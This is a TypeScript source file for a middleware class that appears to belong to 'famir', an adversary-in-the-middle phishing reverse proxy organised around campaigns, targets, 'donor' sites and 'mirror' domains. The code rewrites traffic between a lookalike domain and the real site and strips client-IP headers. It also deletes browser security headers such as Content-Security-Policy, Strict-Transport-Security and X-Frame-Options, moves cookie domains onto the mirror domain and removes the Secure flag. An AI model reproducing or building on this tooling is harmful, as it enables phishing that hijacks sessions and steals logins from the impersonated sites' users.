import { DIContainer } from '@famir/common'
import { HTTP_SERVER_ROUTER, HttpServerRouter } from '@famir/http-server'
import { Logger, LOGGER } from '@famir/logger'
import { TEMPLATER, Templater } from '@famir/templater'
import { Validator, VALIDATOR } from '@famir/validator'
import { BaseController } from '../base/index.js'
import { TRANSFORM_CONTROLLER } from './transform.js'

/**
 * Represents a transform controller
 *
 * @category Transform
 */
export class TransformController extends BaseController {
  /**
   * Register dependency
   */
  static register(container: DIContainer) {
    container.registerSingleton<TransformController>(
      TRANSFORM_CONTROLLER,
      (c) =>
        new TransformController(
          c.resolve(VALIDATOR),
          c.resolve(LOGGER),
          c.resolve(TEMPLATER),
          c.resolve(HTTP_SERVER_ROUTER)
        )
    )
  }

  /**
   * Resolve dependency
   */
  static resolve(container: DIContainer): TransformController {
    return container.resolve(TRANSFORM_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    templater: Templater,
    router: HttpServerRouter
  ) {
    super(validator, logger, templater, router)

    this.logger.debug(`TransformController initialized`)
  }

  use() {
    this.router.addMiddleware('transform', async (ctx, next) => {
      const campaignShare = this.getState(ctx, 'campaignShare')
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const targets = this.getState(ctx, 'targets')
      const message = this.getState(ctx, 'message')

      message.addRequestHeadInterceptor('transform', () => {
        message.url.merge({
          protocol: target.donorProtocol,
          hostname: target.donorHostname,
          port: target.donorPort.toString(),
        })

        message.requestHeaders.set('Host', target.donorHost)

        const oldOrigin = message.requestHeaders.getString('Origin')
        if (oldOrigin) {
          const newOrigin = message.rewriteUrl(oldOrigin, true, targets)
          message.requestHeaders.set('Origin', newOrigin)
        }

        const oldReferer = message.requestHeaders.getString('Referer')
        if (oldReferer) {
          const newReferer = message.rewriteUrl(oldReferer, true, targets)
          message.requestHeaders.set('Referer', newReferer)
        }

        message.requestHeaders.delete([
          'Via',
          'X-Real-Ip',
          'X-Client-Ip',
          'X-Forwarded-For',
          'X-Forwarded-Host',
          'X-Forwarded-Proto',
        ])

        const cookies = message.requestHeaders.getCookies()
        if (cookies) {
          campaignShare.sessionCookieNames.forEach((sessionCookieName) => {
            if (cookies[sessionCookieName]) {
              cookies[sessionCookieName] = undefined
            }
          })

          message.requestHeaders.setCookies(cookies)
        }
      })

      message.addRequestBodyInterceptor('transform', () => {
        const contentType = message.requestHeaders.getContentType()
        if (contentType) {
          if (message.isRewriteUrlContentType(contentType)) {
            const charset = contentType.parameters['charset']

            const oldText = message.requestBody.getText(charset)
            if (oldText) {
              const newText = message.rewriteUrl(oldText, true, targets)
              message.requestBody.setText(newText)
            }
          }
        }
      })

      message.addResponseHeadInterceptor('transform', () => {
        const oldLocation = message.responseHeaders.getString('Location')
        if (oldLocation && message.isAbsoluteUrl(oldLocation)) {
          const newLocation = message.rewriteUrl(oldLocation, false, targets)
          message.responseHeaders.set('Location', newLocation)
        }

        const oldAcao = message.responseHeaders.getString('Access-Control-Allow-Origin')
        if (oldAcao) {
          const newAcao = message.rewriteUrl(oldAcao, false, targets)
          message.responseHeaders.set('Access-Control-Allow-Origin', newAcao)
        }

        message.responseHeaders.delete([
          'Proxy-Agent',
          'Content-Security-Policy',
          'Content-Security-Policy-Report-Only',
          'Permissions-Policy',
          'Strict-Transport-Security',
          'X-XSS-Protection',
          'X-Content-Type-Options',
          'X-Frame-Options',
        ])

        const setCookies = message.responseHeaders.getSetCookies()
        if (setCookies) {
          Object.keys(setCookies).forEach((name) => {
            const setCookie = setCookies[name]

            if (setCookie) {
              if (setCookie.domain) {
                setCookie.domain = '.' + campaign.mirrorDomain
              }

              if (setCookie.secure && !target.mirrorSecure) {
                setCookie.secure = false
              }
            }
          })

          message.responseHeaders.setSetCookies(setCookies)
        }
      })

      message.addResponseBodyInterceptor('transform', () => {
        const contentType = message.responseHeaders.getContentType()
        if (contentType) {
          if (message.isRewriteUrlContentType(contentType)) {
            const charset = contentType.parameters['charset']

            const oldText = message.responseBody.getText(charset)
            if (oldText) {
              const newText = message.rewriteUrl(oldText, false, targets)
              message.responseBody.setText(newText)
            }
          }
        }
      })

      await next()
    })
  }
}
